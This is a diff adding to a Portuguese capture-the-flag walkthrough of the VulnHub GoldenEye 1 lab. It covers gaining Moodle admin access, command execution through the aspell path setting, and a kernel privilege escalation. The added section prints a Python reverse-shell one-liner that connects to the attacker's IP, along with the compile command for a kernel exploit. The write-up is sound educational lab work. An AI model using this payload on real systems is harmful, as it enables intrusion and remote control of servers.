@@ -1,12 +1,12 @@
 ---
 title: "VulnHub - GoldenEye 1"
-tags: [Linux, Easy]
+tags: [Linux, Medium, CC, Moodle, Kernel, Searchsploit, BurpSuite, Wfuzz, Gobuster, SMTP, Hydra]
 categories: VulnHub
 ---
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/inicial.png)
 
-Link: [GoldenEye1](https://www.vulnhub.com/entry/w34kn3ss-1,270/)
+Link: [GoldenEye1](https://www.vulnhub.com/entry/goldeneye-1,240/)
 
 # Enumeração
 
@@ -265,7 +265,7 @@ password: 4England!
 
 Agora voltamos para a página web, já que temos novas credenciais e ele fala pra mexermos até encontrar alguma coisa interessante...
 
-## Re-Re-Enumeração Porta 80 - severnaya-station.com - Doak user e Admin user
+## Re-Re-Enumeração Porta 80 - severnaya-station.com - Doak user
 
 Bom, então logamos com o novo usuário
 
@@ -293,12 +293,152 @@ Possivelmente as credencias do admin...
 
 **admin:xWinter1995x!**
 
+## Re-Re-Enumeração Porta 80 - severnaya-station.com - Admin user
+
 Logamos como admin então
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm.png)
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm1.png)
 
+Agora começamos a vasculhar todo o site atrás de algo importante
 
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm2.png)
+
+Encontramos a versão dele... agora fica mais fácil de explorar!
+
+**Versão 2.2** 
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm3.png)
+
+Pesquisamos por exploits pra ele então
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm4.png)
+
+[ExploitDB](https://www.exploit-db.com/exploits/29324)
+
+Encontramos esse módulo do Metasploit Framework que explora essa versão do moodle
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/adm5.png)
+
+# Explorando Moodle 2.2 - PSpellShell
+
+Não gosto de fazer as coisas automáticas com o metasploit framework... vamos explorar do modo manual
+
+Depois de pesquisar bastante sobre como explorar esse moodle, encontramos uma dica na referência abaixo, onde podemos explorar o **Spell Checker** dele, pra ao invés de ser no Google, como padrão, vir me dar um shell na minha máquina... Vamos lá
+
+[Referência](https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec)
+
+Tudo que precisamos fazer é editar o parâmetro **system paths**, que pode ser econtrado em **Site Aministration** --> **Server** --> **System Paths** e no campo **Path to aspell**, nós inserimos nosso reverse shell...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex.png)
+
+Adicionamos nosso reverse shell
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",55135));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex1.png)
+
+Agora em **Site Administration** --> **Plugins** --> **Text Editors** --> **TinyMCE HTML Editor** mudamos o **Spell Engine** de **Google** para **PSpellShell**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex2.png)
+
+Agora fazemos um **post no blog** e clicamos em **Toggle SpellChecker** enquanto nosso nc está escutando na porta
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex3.png)
+
+Recebemos a conexão reversa
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex4.png)
+
+Pronto, agora temos um shell de **www-data**
+
+# www-data --> Root
+
+Vamos iniciar a escalação de privilégio agora
+
+[Shell Interativo](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+
+Navegando pela página web dele, encontramos um arquivo que não tinhamos visto antes... o splashAdmin.php
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex5.png)
+
+Acessando via web, temos...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex6.png)
+
+Nesta mesma página achamos uma mensagem dizendo que o GCC foi excluído... por que?! Interessante...
+
+```
+Greetings ya'll! GoldenEye Admin here.
+
+For programming I highly prefer the Alternative to GCC, which FreeBSD uses. It's more verbose when compiling, throwing warnings and such - this can easily be turned off with a proper flag. I've replaced GCC with this throughout the GolenEye systems.
+
+Boris, no arguing about this, GCC has been removed and that's final!
+
+Also why have you been chatting with Xenia in private Boris? She's a new contractor that you've never met before? Are you sure you've never worked together...?
+
+-Admin
+```
+
+Encontramos outra pasta também que não tinhamos visto antes...
+
+**http://192.168.56.121/006-final/xvf7-flag/**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex7.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ex8.png)
+
+Bom... não entendi nada... vamos prosseguir
+
+## Kernel Exploitation
+
+Bom... o gcc geralmente é usado pra compilar exploits pra kernel em CTFs e outras máquinas... se ele falou que o GCC foi substituido por outro equivalmente, muito possivelmente essa máquina está vulnerável a esse tipo de ataque...
+
+Com o comando **uname -a** verificamos a versão do kernel que está instalada nele
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker.png)
+
+Uma rápida pesquisada no **searchsploit** e vemos que temos um exploit para essa versão
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker1.png)
+
+Copiamos para nossa pasta
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker2.png)
+
+Não adianta compilarmos na nossa máquina e jogar pra lá... não vai dar certo... pesquisando na internet eu encontrei uma alternativa para o GCC, é o CC, aqui está o [Stack Overflow](https://stackoverflow.com/questions/1699495/is-there-any-alternative-to-gcc-to-do-pratical-development-under-nix) que fala sobre ele...
+
+Verificando, temos ele na máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker3.png)
+
+Passamos o exploit para a máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker4.png)
+
+Trocamos onde está "gcc" por "cc"
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker5.png)
+
+Compilamos ele
+
+```bash
+cc 37292.c -o exp 2>/dev/null
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker6.png)
+
+Executamos e viramos root!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/ker7.png)
+
+Pegamos a flag!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/flag.png)
+
+Agora faz sentido aquele diretório que temos lá que tinha a final flag na web...
 
 
